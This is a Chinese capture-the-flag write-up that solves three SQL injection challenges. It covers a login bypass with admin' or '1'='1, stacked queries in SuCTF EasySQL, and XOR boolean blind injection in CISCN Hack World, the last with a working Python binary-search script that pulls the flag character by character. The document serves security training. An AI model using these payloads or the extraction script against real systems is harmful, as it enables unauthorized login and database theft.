# Nep第五周

在buu上做了几道SQL的题目



## [极客大挑战 2019] EasySQL

题目：

![](https://gitee.com/chen-lishan/tuc/raw/master/题目.png)

页面为登陆模式，需要输入用户名和密码

尝试输入1，结果提示用户名和密码错误；

在`username`处加个常规的`'`，结果报错了：

![](https://gitee.com/chen-lishan/tuc/raw/master/报错.png)

考虑到是SQL注入，于是在用户名和密码均输入万能密码:

```
admin' or '1'='1
```

成功登录，得到flag





## [SUCTF 2019]EasySQL1

### 判断注入方法

显注：union 联合查询，union被过滤

报错注入：and、or、updatexml被过滤。没有报错信息，报错注入基本不用考虑

bool注入：and、or被过滤。不管怎么样都是返回nonono，就连数据库长度大于1这种探针都返回nonono，说明应该不是bool注入

time注入：and、or被过滤。

**堆叠注入**：考虑到过滤了很多关键词，尝试堆叠查询，这个可使用的语句比较多。就是一个sql语句";"后面可以继续执行sql查询语句

### 堆叠注入

**post 传参**

```mysql
1;show databases;   #查询数据库
1;show tables;      #查询表名
```

![](https://gitee.com/chen-lishan/tuc/raw/master/tables.png)

构造**payload**

```
*,1
```

拼接一下，就是：`select *,1||flag from Flag`

等同于`select *,1 from Flag`

**查询语句**：`select *,1||flag from Flag`

- sql=select.post['query']."||flag from Flag";
  如果$post['query']的数据为*,1，sql语句就变成了`select *,1||flag from Flag`，
  就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。

- `||`在mysql中表示或，如果前一个操作数为真，则不看后面的语句

  `||`相当于将 select 1 和 select flag from flag 的结果拼接在一起

- select任何一个常数都会在表中新建一列，即增加一个临时列，列名是1。然后查询出那一列的内容。`select 1 from Flag`的结果就是那一列的值都为1，这一列有几个字段取决于原字段的多少。

整个payload语句的意思就是查询所有数据，然后增加一个临时列

第一列是本来数据库的，后面是新增的临时列



![](https://gitee.com/chen-lishan/tuc/raw/master/1.flag.png)



## [CISCN2019 华北赛区 Day2 Web1]Hack World

#### bool盲注

题目提示是sql注入

简单测试一下，输入不同的字符会有不同的回显，输入`1'`，返回bool（false），那么，应该是**bool注入**

![](https://gitee.com/chen-lishan/tuc/raw/master/bool.png)

测试发现，ascii、substr都没有被过滤；空格被过滤了，可以使用()代替



#### **POST传参**

**POST传参**，payload写在下方，`id=`

而GET传参，payload应连在网址后面

![](https://gitee.com/chen-lishan/tuc/raw/master/post.png)



#### 异或

题目提示：All You Want Is In Table 'flag' and the column is 'flag'

flag在flag表的flag字段中，于是可以写`select(flag)from(flag)`

```
0^(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'))
```

`^`是异或，意思是or

#### 二分脚本

```python
import requests
import time
url='http://b983611d-30c5-4eef-bd3d-4178a5d4656b.node3.buuoj.cn'
result=''

for x in range(1,50):
    high=127
    low=32
    mid=(high+low)//2
    while high>low:
        payload="0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(x,mid)
        data={"id":payload}
        html=requests.post(url,data=data).text
        #time.sleep(0.5)
        if "Hello" in html:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
    result+=chr(int(mid))
    print(result)
```

**format 函数**：

通过 `{}`和 `: `来代替以前的 `%` 。format 函数可以接受不限个参数，位置可以不按顺序。

得到flag：

![img](https://gitee.com/chen-lishan/tuc/raw/master/3.flag.png)